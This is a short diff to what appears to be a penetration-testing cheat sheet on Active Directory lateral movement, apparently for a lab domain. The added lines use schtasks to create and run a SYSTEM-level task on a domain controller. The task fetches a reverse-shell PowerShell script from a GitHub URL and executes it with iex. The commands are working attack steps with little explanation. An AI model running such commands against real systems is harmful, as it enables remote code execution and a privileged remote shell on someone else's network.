@@ -325,6 +325,10 @@ schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "U
 ```
 
 ```
+schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Updater123" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/conma293/mvp/main/Invoke-PowerShellTcp.ps1'')'"
+```
+
+```
 schtasks /Run /S dc01.ecorp.moneycorp.local /TN "Updater123"
 ```
 Note: Similar to PTH for applicable kerberos systems 
